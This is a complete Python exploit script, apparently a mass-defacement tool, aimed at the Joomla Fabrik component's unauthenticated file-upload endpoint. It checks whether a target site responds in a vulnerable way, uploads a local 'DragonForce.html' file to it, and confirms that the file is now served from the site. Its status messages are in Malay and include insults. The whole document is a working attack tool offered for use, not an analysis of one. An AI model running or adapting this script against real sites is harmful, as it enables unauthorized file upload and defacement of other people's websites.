#!/usr/bin/env python
#_*_ coding: utf8 _*_

import requests
import argparse
import sys
import urllib3
from os import path

urllib3.disable_warnings()
parser = argparse.ArgumentParser(description="Joomla Exploit")
parser.add_argument('-t','--target',help="Target")
argsv = parser.parse_args()

path_exploit = "index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
user_agent = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51'}

def banner():
	print("""
   _____ _          _ _   _    _       _                 _ 
  / ____| |        | | | | |  | |     | |               | |
 | (___ | |__   ___| | | | |  | |_ __ | | ___   __ _  __| |
  \___ \| '_ \ / _ \ | | | |  | | '_ \| |/ _ \ / _` |/ _` |
  ____) | | | |  __/ | | | |__| | |_) | | (_) | (_| | (_| |
 |_____/|_| |_|\___|_|_|  \____/| .__/|_|\___/ \__,_|\__,_|
                                | |                        
                                |_|                        

		""")

def repair_url_add(url):
    ur = list(url)
    if ur[-1] == '/':
        ur.pop()
    else:
        pass
    url = ''.join(ur)
    if url.startswith('http://') or url.startswith('https://'):
        pass
    else:
        url = "http://" + url

    return url

def verify(url):
	print('[+] Sabar jap tengah scan thread...')
	try:
		pet = requests.get(url + "/" + path_exploit, headers=user_agent)
		if '{"filepath":null,"uri":null}' in pet.text:
			print('[+] Ha site vuln, tunggu sat...')
		else:
			print('[x] Site tak vuln jilake')
			sys.exit(1)
	except:
		print('[x] Site apa kau bagini? Bad lol')
		sys.exit(1)

def exploit(url):
	exploit_dir = url + "/" + path_exploit
	file='DragonForce.html'
	if path.exists(file):
		f = open(file)
	else:
		print('[x] File kau mana babi')
		sys.exit(1)
	try:
		r =  requests.post(url=exploit_dir, headers=user_agent, data={'title':'test_file'}, files={'file':f})
		print('[+] Jap, Uploading!')
		print('[-] Sabar, tengah scan...')
		try:
			verif = requests.get(url + "/" + file)
			if verif.status_code == 200:
				print('[+] Ha exploit success! => {}'.format(url + "/" + file))
			else:
				print('[x] Exploit failed pantat')
		except:
			print('[x] Takdapat cari file pun :(')	
			sys.exit(1)
	except:
		print('[x] Tak dapat access site :(')
		sys.exit(1)

def main():
	banner()
	if argsv.target:
		url = repair_url_add(argsv.target)
		verify(url)
		exploit(url)
	else:
		print('[x] Aku nak list kau hanat')
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit(1)
